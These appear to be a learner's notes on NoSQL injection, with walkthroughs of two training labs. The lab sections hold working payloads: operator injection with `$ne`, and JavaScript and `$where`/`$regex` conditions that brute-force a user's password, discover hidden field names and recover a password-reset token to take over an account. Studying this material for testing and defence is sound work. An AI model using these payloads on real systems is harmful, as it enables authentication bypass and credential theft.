# NoSQL Injection

NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database.
There are two different types of NoSQL injection:
- **Syntax injection** - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. Use null operator (`%00`) to ignore upcoming conditions.
- **Operator injection** - This occurs when you can use NoSQL query operators to manipulate queries.
  
  
In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.
For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:
    1. Convert the request method from GET to POST.
    2. Change the Content-Type header to application/json.
    3. Add JSON to the message body.
    4. Inject query operators in the JSON.

### LAB: Exploiting NoSQL injection to extract data
Take advantage of the response for request `GET /user/lookup?user=`

    && this.password.length==8 && '1'=='1 -> Return user's info -> password's length = 8
    && this.password.match(/\d/) && '1'=='1 -> Could not find user -> no digit in password
    && this.password[0]=='$a$ -> Brute force to find the password 


### LAB: Exploiting NoSQL operator injection to extract unknown fields
Add this to the JSON in the POST request to `/login`:

    "$where":"Object.keys(this)[4].match('^.{$0$}.*')"    -> look for the biggest number with a valid response -> that's the length of the key

    "$where":"Object.keys(this)[4].match('^.{0}$a$.*')"   -> this means the first character is 'a'. After finding a valid character, add that to the match (e.g. 'b' is a match -> "$where":"Object.keys(this)[4].match('^.{0}ab.*')") and find the next character

    {"username":"carlos","password":{
    "$ne":""},"changePwd":{ "$regex": "^{$a$}" }}    -> changePwd = af03484db14c7c66 

    go to /forgot-password?changePwd=af03484db14c7c66